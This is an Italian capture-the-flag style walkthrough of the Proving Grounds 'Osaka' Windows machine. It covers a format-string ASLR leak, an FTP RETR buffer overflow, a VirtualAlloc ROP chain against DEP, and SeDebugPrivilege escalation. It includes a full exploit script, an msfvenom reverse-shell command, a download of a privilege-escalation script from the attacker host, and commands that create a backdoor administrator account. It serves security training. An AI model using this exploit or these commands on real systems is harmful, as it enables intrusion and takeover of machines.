---
title: 'Osaka Walkthrough Proving Grounds Practice: Buffer Overflow, ASLR Bypass e ROP Chain'
slug: osaka
description: 'Walkthrough Osaka (Proving Grounds Practice): format string leak, ASLR bypass, buffer overflow, ROP chain per bypassare DEP e SeDebugPrivilege.'
image: /osaka.webp
draft: true
date: 2026-03-18T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - Proving Grounds Practice
  - Offsec Vm
---

**Difficoltà:** Hard | **OS:** Windows | **Piattaforma:** Offensive Security Proving Grounds Practice

***

## Introduzione

**Osaka** è una macchina Windows disponibile su Proving Grounds Practice di Offensive Security (OffSec). È una delle poche macchine che richiede un exploit scritto da zero — niente Metasploit, niente exploit pubblici pronti: devi costruire tutto manualmente, step by step.

È una macchina complessa e completa, che copre exploit development reale su Windows: dalla scoperta della vulnerabilità fino alla privilege escalation finale.

In questa guida troverai:

* Enumeration con nmap
* Download e analisi del binario `ftp.exe` con Immunity Debugger e mona
* Scoperta e sfruttamento di una **Format String Vulnerability** nel comando DEBUG
* **ASLR bypass** tramite leak dello stack
* **Buffer Overflow** sul comando RETR (offset 272 byte)
* **ROP Chain** completa per bypassare DEP tramite VirtualAlloc
* Analisi dei gadget: cosa usare e cosa scartare dall’output di mona
* **Privilege Escalation** tramite SeDebugPrivilege

***

## Enumeration

```bash
sudo nmap -sV -p- 192.168.14.152
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
```

La porta 21 è quella interessante. Il server FTP accetta qualsiasi credenziale.

```bash
ftp 192.168.14.152
# Username: hackita
# Password: hackita
```

```
ftp> ls
 ftp.exe        158,208 bytes
 dev.txt             29 bytes
```

Il server espone il suo stesso binario nella directory root. Scarichiamolo.

```
ftp> binary
ftp> get ftp.exe
```

Avere il binario in locale è fondamentale — ci permette di analizzarlo staticamente, trovare le vulnerabilità e calcolare tutti gli offset prima di toccare il target.

***

## Analisi Locale — Immunity Debugger + mona

Carichiamo `ftp.exe` in **Immunity Debugger** su una macchina Windows.

### Step 0 — Setta la cartella di lavoro di mona

```
!mona config -set workingfolder c:\Users\hackita\Desktop\Osaka
```

Tutti i file generati da mona (bytearray, rop chain, risultati) finiranno qui.

### Step 1 — Controlla le protezioni

```
!mona modules -m ftp.exe
```

```
Base       | Top        | ASLR  | NXCompat | SafeSEH | Rebase
0x00a30000 | 0x00a5b000 | True  | False    | True    | True
```

* **ASLR True** — il binario si carica a un indirizzo casuale ad ogni avvio. Non puoi hardcodare indirizzi.
* **NXCompat False** — il binario non ha richiesto DEP esplicitamente. Ma attenzione: Windows può forzare DEP a livello di sistema su tutti i processi, indipendentemente da questo flag. Lo scopriamo testando.
* **SafeSEH True** — i gestori di eccezioni sono protetti. Non ci interessa in questo caso.

> **Nota importante su NXCompat vs DEP:** Sono due livelli diversi. NXCompat False significa che il *binario* non ha chiesto DEP al compilatore. Ma Windows ha la sua policy — se DEP è impostato su `AlwaysOn`, viene forzato su tutti i processi indipendentemente dal binario. Lo scopriamo solo testando lo shellcode direttamente sullo stack.

***

## Scoperta della Format String Vulnerability

Analizzando il binario con un disassembler notiamo che il server implementa un comando `DEBUG` non documentato. Nel codice troviamo questa chiamata:

```c
// Comando normale — format string fissa, sicuro
sub_401060(v27, "%d.%d.%d.%d", v41[0]);

// Comando DEBUG — format string controllata dall'utente, VULNERABILE
sub_401060(&v23, v26, (char)sub_4010F0);
sub_401060(&v23, "%s\r\n", (char)&v23);
```

`v26` contiene l'input dell'utente. La funzione `sub_401060` è una `sprintf`/`printf`. Il secondo parametro — la format string — non è una stringa fissa ma l'input diretto dell'utente.

Questo è esattamente la definizione di **Format String Vulnerability**.

***

## Format String Vulnerability — Teoria e Pratica

### Cos'è una format string vulnerability

`printf("%s", input)` — sicuro. La format string è fissa, l'input è un dato.

`printf(input)` — vulnerabile. L'input dell'utente *diventa* la format string.

Se l'utente passa `%x` come input, la funzione interpreta `%x` come istruzione di formattazione e va a prendere il prossimo valore sullo stack, stampandolo in esadecimale.

### I format specifier pericolosi

| Specifier | Cosa fa                                                                                      |
| --------- | -------------------------------------------------------------------------------------------- |
| `%x`      | Legge 4 byte dallo stack e li stampa in esadecimale                                          |
| `%d`      | Legge 4 byte dallo stack e li stampa come intero decimale                                    |
| `%s`      | Legge 4 byte dallo stack, li interpreta come puntatore e stampa la stringa a quell'indirizzo |
| `%n`      | **Scrive** nello stack il numero di caratteri stampati finora — il più pericoloso            |
| `%p`      | Come `%x` ma con formato puntatore (es. `0x00a310f0`)                                        |
| `%08x`    | Come `%x` ma con padding a 8 caratteri — utile per leggere valori allineati                  |

### Come usiamo %x per leakare la base

Lo stack durante l'esecuzione contiene: variabili locali, indirizzi di ritorno, parametri — tutto. Quando il programma gira, sullo stack ci sono indirizzi interni del programma stesso.

Mandando `%x|` ripetuto 100 volte, "fotografiamo" 100 valori consecutivi dallo stack:

```bash
quote DEBUG %x|%x|%x|...  # ripetuto 100 volte
```

Risposta del server:

```
DEBUG a310f0|7750c9b4|00000000|...
```

Il primo valore — `a310f0` — è un indirizzo interno di `ftp.exe`. Da lì calcoliamo la base.

> **Perché `quote`?** Il client FTP standard intercetta e blocca i comandi non standard. Con `quote` mandiamo il comando raw al server senza che il client lo filtri.

### Calcolo degli offset

Con Immunity Debugger in esecuzione:

```
!mona modules -m ftp.exe
→ Base attuale: 0x00a30000

!mona jmp -r esp -m ftp.exe
→ jmp esp trovato: 0x00a310da
```

```
Valore leakato con %x:  0xa310f0
Base attuale:           0xa30000
Offset del leak:        0xa310f0 - 0xa30000 = 0x10f0  ← fisso per sempre

Indirizzo jmp esp:      0xa310da
Base attuale:           0xa30000
Offset di jmp esp:      0xa310da - 0xa30000 = 0x10da  ← fisso per sempre
```

Questi due offset non cambiano mai — sono determinati dal compilatore. ASLR cambia solo la base. Quindi ad ogni avvio:

```python
distanza_leak    = 0x10f0
distanza_jmp_esp = 0x10da

nuova_base    = nuovo_leak - distanza_leak
jmp_esp_reale = nuova_base + distanza_jmp_esp
```

***

## Buffer Overflow sul Comando RETR

### Fuzzing — trova quando crasha

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.10", 21))
s.recv(1024)  # banner 220 Welcome
s.send(b"USER hackita\r\n")
s.recv(1024)
s.send(b"PASS hackita\r\n")
s.recv(1024)
payload = b"A" * 500
s.send(b"RETR " + payload + b"\r\n")
```

Il programma crasha con 500 `A`. Troviamo l'offset esatto.

### Trova l'offset esatto

```bash
msf-pattern_create -l 500
```

Manda il pattern al posto delle `A`. In Immunity leggi il valore di EIP al crash e:

```bash
msf-pattern_offset -q 39694438
# [*] Exact match at offset 272
```

**Offset: 272 byte.**

### Conferma controllo EIP

```python
payload = b"A"*272 + b"B"*4
```

Se EIP mostra `42424242` — controlli EIP.

### Bad Characters

```
!mona bytearray -b "\x00"
```

```python
badchars = bytes(range(1, 256))
payload = b"A"*272 + b"B"*4 + badchars
s.send(b"RETR " + payload + b"\r\n")
```

Dopo il crash, guarda ESP in Immunity e confronta:

```
!mona compare -f bytearray.bin -a [INDIRIZZO_ESP]
→ Hooray, normal shellcode unmodified
→ Bytes omitted: 00
```

Solo `\x00` è un bad char.

### Prima difficoltà — DEP attivo

Il primo tentativo senza ROP fallisce. EIP salta su ESP correttamente, ma lo shellcode non esegue — **DEP è attivo**. Serve una ROP Chain.

***

## ROP Chain — Teoria Completa

### Cos'è DEP

DEP (Data Execution Prevention) divide la memoria in due tipi: memoria dove leggi e scrivi dati (stack, heap) e memoria dove esegui codice (sezioni `.text` del binario). Lo stack è dati — con DEP qualsiasi esecuzione sullo stack causa crash immediato.

### Cos'è una ROP Chain

ROP (Return Oriented Programming) bypassa DEP usando codice già esistente nel binario — nelle sezioni eseguibili, non sullo stack.

Un **gadget** è un piccolo frammento di istruzioni già presente nel binario che termina con `RETN`. `RETN` prende il valore in cima allo stack e ci salta. Se controlli lo stack, controlli dove salta ogni `RETN`.

Una **ROP chain** è una lista di indirizzi di gadget messi in sequenza sullo stack. Ogni gadget esegue, poi `RETN` salta al successivo. Risultato: esecuzione arbitraria senza mai scrivere codice sullo stack.

### Perché VirtualAlloc

Lo scopo della chain è chiamare `VirtualAlloc` — una funzione di Windows che alloca nuova memoria con permessi di esecuzione. Una volta allocata questa memoria, ci copiamo lo shellcode e ci saltiamo.

Parametri che carichiamo:

* `EBX = 0x1` (lpAddress — lasciamo scegliere a Windows)
* `EDX = 0x1000` (dwSize — 4096 byte)
* `ECX = 0x40` (flProtect — PAGE\_EXECUTE\_READWRITE)

### Come funziona PUSHAD

`PUSHAD` spinge tutti i registri sullo stack in ordine: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI. VirtualAlloc legge i suoi parametri dallo stack in questo ordine. Dobbiamo quindi caricare i valori giusti nei registri giusti **prima** di chiamare PUSHAD.

***

## Generazione della ROP Chain con mona

```
!mona rop -m ftp.exe
```

Questo è l'XML completo che abbiamo ricevuto:

```xml
<gadgets base="0x00a30000">
  <gadget offset="0x00005181">POP ECX # RETN</gadget>
  <gadget offset="0x0001e008">ptr to VirtualAlloc()</gadget>
  <gadget offset="0x00009a8f">MOV EAX,DWORD PTR DS:[ECX] # RETN</gadget>
  <gadget offset="0x0000c9d6">POP ESI # RETN</gadget>
  <gadget value="0xffffffff"/>
  <gadget offset="0x0000e5eb">INC ESI # ADD AL,5E # RETN</gadget>
  <gadget offset="0x00004336">ADD ESI,EAX # INC ECX # ADD AL,0 # POP EDI # POP EBP # RETN</gadget>
  <gadget value="junk">Filler</gadget>
  <gadget offset="0x00007e14">POP EBP # RETN</gadget>
  <gadget offset="0x000010da">jmp esp</gadget>
  <gadget offset="0x000013bf">POP EBX # RETN</gadget>
  <gadget value="0x00000001">0x00000001 -> ebx</gadget>
  <gadget offset="0x0001bd7e">POP EDX # RETN</gadget>
  <gadget value="0x00001000">0x00001000 -> edx</gadget>
  <gadget offset="0x00005181">POP ECX # RETN</gadget>
  <gadget value="0x00000040">0x00000040 -> ecx</gadget>
  <gadget offset="0x00004655">POP EDI # RETN</gadget>
  <gadget offset="0x00004682">RETN (ROP NOP)</gadget>
  <gadget offset="0x0001d2bf">POP EAX # RETN</gadget>
  <gadget value="0x90909090">nop</gadget>
  <gadget offset="0x000010d6">PUSHAD # RETN</gadget>
</gadgets>
```

### La chain standard — cosa fa e perché non la usiamo tutta

I primi gadget dell'XML sono la **chain standard** per caricare VirtualAlloc in ESI in modo indiretto:

```
POP ECX        → ECX = 0x1e008 (indirizzo del puntatore a VirtualAlloc)
MOV EAX,[ECX]  → EAX = valore a quell'indirizzo = VirtualAlloc
POP ESI        → ESI = 0xffffffff
INC ESI        → ESI = 0x00000000
ADD ESI,EAX    → ESI = 0 + VirtualAlloc = VirtualAlloc
```

Questo percorso esiste perché non sempre è possibile caricare direttamente VirtualAlloc in ESI. In questo binario però esiste un gadget più diretto: `JMP [EAX]`.

### Gadget aggiuntivo — JMP \[EAX]

`JMP [EAX]` non è nell'XML di mona rop — va cercato a mano. I byte di questa istruzione in assembly sono `\xff\x20`:

```
!mona find -s "\xff\x20" -m ftp.exe
→ 0x00a44adb  (offset dalla base: 0x14adb)
```

Attenzione, l'XML cambierà ogni volta che iniziate la vm, e controllate solo virtualalloc.xml non i vari txt.

### Chain alternativa — cosa abbiamo tenuto e cosa abbiamo scartato

**RIMOSSO — parte complessa della chain standard:**

| Gadget                           | Offset    | Motivo rimozione                         |
| -------------------------------- | --------- | ---------------------------------------- |
| POP ECX                          | `0x5181`  | Sostituito                               |
| ptr VirtualAlloc come valore ECX | `0x1e008` | EAX lo carica direttamente               |
| MOV EAX,\[ECX]                   | `0x9a8f`  | Rimosso — EAX viene caricato con POP EAX |
| POP ESI                          | `0xc9d6`  | Spostato con valore diverso              |
| `0xffffffff`                     | —         | Non più necessario                       |
| INC ESI                          | `0xe5eb`  | Rimosso                                  |
| ADD ESI,EAX                      | `0x4336`  | Rimosso                                  |
| junk Filler                      | —         | Rimosso                                  |

**MANTENUTO e riorganizzato — chain alternativa:**

| Gadget           | Offset    | Scopo                                                                 |
| ---------------- | --------- | --------------------------------------------------------------------- |
| POP EBP          | `0x7e14`  | Carica EBP                                                            |
| POP EBP (skip)   | `0x7e14`  | Il secondo POP EBP consuma il valore successivo sullo stack come skip |
| POP EBX          | `0x13bf`  | EBX = 1                                                               |
| `0x1`            | —         | Valore per EBX                                                        |
| POP EDX          | `0x1bd7e` | EDX = 0x1000                                                          |
| `0x1000`         | —         | Valore per EDX (size)                                                 |
| POP ECX          | `0x5181`  | ECX = 0x40                                                            |
| `0x40`           | —         | Valore per ECX (PAGE\_EXECUTE\_READWRITE)                             |
| POP EDI          | `0x4655`  | EDI = RETN NOP                                                        |
| RETN NOP         | `0x4682`  | Gadget neutro — placeholder                                           |
| POP ESI          | `0xc9d6`  | ESI = JMP \[EAX]                                                      |
| JMP \[EAX]       | `0x14adb` | Valore per ESI — salta al valore puntato da EAX                       |
| POP EAX          | `0x1d2bf` | EAX = puntatore a VirtualAlloc                                        |
| ptr VirtualAlloc | `0x1e008` | Valore per EAX                                                        |
| PUSHAD           | `0x10d6`  | Spinge tutti i registri sullo stack → innesca VirtualAlloc            |
| JMP ESP          | `0x10da`  | Salta allo shellcode dopo l'allocazione                               |

**Il meccanismo chiave:** ESI contiene `JMP [EAX]`. EAX contiene il puntatore a VirtualAlloc. Quando PUSHAD spinge i registri, il meccanismo di chiamata usa ESI per saltare — `JMP [EAX]` porta direttamente a VirtualAlloc. Più corto, più diretto della chain standard.

***

## Exploit Completo

### Genera lo shellcode

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  LHOST=10.10.10.10 LPORT=4444 -b "\x00" -f py
```

### Script finale

```python
import socket
from struct import pack

# Offset calcolati una volta sola con mona
distanza_leak    = 0x10f0
distanza_jmp_esp = 0x10da

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.14.152", 21))
s.recv(1024)  # banner 220 Welcome

s.send(b"USER hackita\r\n")
s.recv(1024)
s.send(b"PASS hackita\r\n")
s.recv(1024)

# ASLR Bypass — leak tramite format string
s.send(b"DEBUG " + b"%x|"*100 + b"\r\n")
leak = s.recv(1024)
leak_value = int(leak.split(b"|")[0].split(b" ")[-1], 16)
nuova_base    = leak_value - distanza_leak
jmp_esp_reale = nuova_base + distanza_jmp_esp
print(f"Leak:          {hex(leak_value)}")
print(f"Nuova base:    {hex(nuova_base)}")
print(f"jmp esp reale: {hex(jmp_esp_reale)}")

# Shellcode (generato con msfvenom -b "\x00")
buf = b""
buf += b"[SOSTITUIRE CON IL PROPRIO SHELLCODE]"

# ROP Chain alternativa con JMP [EAX]
rop_gadgets = [
    0x7e14  + nuova_base,  # POP EBP
    0x7e14  + nuova_base,  # skip 4 bytes
    0x13bf  + nuova_base,  # POP EBX
    0x1,                   # EBX = 1
    0x1bd7e + nuova_base,  # POP EDX
    0x1000,                # EDX = 0x1000 (size)
    0x5181  + nuova_base,  # POP ECX
    0x40,                  # ECX = 0x40 (PAGE_EXECUTE_READWRITE)
    0x4655  + nuova_base,  # POP EDI
    0x4682  + nuova_base,  # RETN NOP (valore per EDI)
    0xc9d6  + nuova_base,  # POP ESI
    0x14adb + nuova_base,  # JMP [EAX] (valore per ESI)
    0x1d2bf + nuova_base,  # POP EAX
    0x1e008 + nuova_base,  # ptr to VirtualAlloc (valore per EAX)
    0x10d6  + nuova_base,  # PUSHAD # RETN
    0x10da  + nuova_base,  # JMP ESP
]

rop = b""
for g in rop_gadgets:
    rop += pack("<I", g)  # little endian, 4 byte per gadget

total = 1000
payload  = b"A"*272        # padding fino a EIP
payload += rop             # ROP chain
payload += b"\x90"*16     # NOP sled
payload += buf             # shellcode
payload += b"B"*(total - len(payload))  # padding finale

input("Listener pronto? premi invio...")
s.send(b"RETR " + payload + b"\r\n")
```

### Listener

```bash
nc -lvnp 4444
```

Shell come `osaka\wilson`.

***

## Privilege Escalation — SeDebugPrivilege

```
C:\dev> whoami /priv
SeDebugPrivilege    Debug programs    Enabled
```

`SeDebugPrivilege` permette di iniettare codice in processi che girano come SYSTEM — come `winlogon.exe`.

**Su Kali:**

```bash
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
python3 -m http.server 8000
```

**Sul target:**

```powershell
powershell -c "Invoke-WebRequest http://10.10.10.10:8000/psgetsys.ps1 -OutFile psgetsys.ps1"
powershell -c "Import-Module .\psgetsys.ps1"
powershell -c "Get-Process winlogon"
# PID: 544
```

```powershell
powershell -c "[MyProcess]::CreateProcessFromParent('544', 'c:\windows\system32\cmd.exe', '/c net user hackita Start123! /add')"
powershell -c "[MyProcess]::CreateProcessFromParent('544', 'c:\windows\system32\cmd.exe', '/c net localgroup administrators hackita /add')"
```

```bash
rdesktop 192.168.14.152 -u hackita -p Start123!
```

SYSTEM ottenuto.

***

## Riepilogo Tecnico

| Protezione | Stato                       | Bypass                            |
| ---------- | --------------------------- | --------------------------------- |
| ASLR       | Attivo                      | Format String Leak via `DEBUG %x` |
| DEP        | Attivo (forzato da Windows) | ROP Chain + VirtualAlloc          |
| SafeSEH    | Attivo                      | Non sfruttato                     |

| Step                 | Tecnica                                 |
| -------------------- | --------------------------------------- |
| Leak base address    | Format String — `DEBUG %x\|` x100       |
| BOF offset           | 272 byte — trovato con msf-pattern      |
| Bypass DEP           | ROP Chain alternativa con JMP \[EAX]    |
| Shellcode esecuzione | VirtualAlloc → PAGE\_EXECUTE\_READWRITE |
| Privesc              | SeDebugPrivilege + psgetsys.ps1         |

***

## Concetti Chiave

**Format String Vulnerability** nasce da `printf(input)` invece di `printf("%s", input)`. Con `%x` leggi valori dallo stack — inclusi indirizzi interni del programma. Con `%x` ripetuto 100 volte ottieni una fotografia dello stack.

**ASLR** randomizza solo la base. Gli offset tra gadget e base sono fissi — il compilatore li decide una volta sola. Una volta leakato la base, sai dove si trova tutto.

**NXCompat vs DEP** sono due livelli diversi. NXCompat è il flag del binario. DEP è la policy di Windows. Windows vince sempre.

**ROP Chain** usa gadget già esistenti nel binario nelle sezioni eseguibili. Ogni gadget finisce con RETN. RETN salta al prossimo valore sullo stack — creando una catena.

**Chain alternativa vs standard:** La standard carica VirtualAlloc in ESI in modo indiretto tramite POP ECX → MOV EAX,\[ECX] → INC/ADD. La alternativa usa JMP \[EAX] — più corta, stesso risultato.

***

***Walkthrough scritto a scopo educativo per Hackita. Testa solo su macchine di tua proprietà o su piattaforme autorizzate come Proving Grounds.***

## Riferimenti e Risorse

### 🔗 Approfondimenti Tecnici

* Osaka Proving Grounds Walkthrough\
  [https://routezero.security/2024/11/29/proving-grounds-practice-osaka-walkthrough/](https://routezero.security/2024/11/29/proving-grounds-practice-osaka-walkthrough/)
* Buffer Overflow Osaka PG Writeup\
  [https://medium.com/@aaronashley466/bufferoverflow-osaka-pg-560654fb9ea5](https://medium.com/@aaronashley466/bufferoverflow-osaka-pg-560654fb9ea5)
* Microsoft Docs — VirtualAlloc API\
  [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

***

### 🔗 Risorse HackIta

* Guida completa Active Directory\
  [https://hackita.it/articoli/active-directory/](https://hackita.it/articoli/active-directory/)
* Buffer Overflow guida\
  [https://hackita.it/articoli/buffer-overflow/](https://hackita.it/articoli/buffer-overflow/)
* ROP Chain spiegazione\
  [https://hackita.it/articoli/rop-chain/](https://hackita.it/articoli/rop-chain/)

***

## 🚀 Formazione e Servizi

Vuoi diventare davvero forte nel pentesting, prepararti per OSCP o testare la sicurezza della tua azienda?

👉 Formazione 1:1 e servizi di sicurezza\
[https://hackita.it/servizi](https://hackita.it/servizi)

Se vuoi supportare il progetto HackIta:

👉 Supporta il progetto\
[https://hackita.it/supporto](https://hackita.it/supporto)
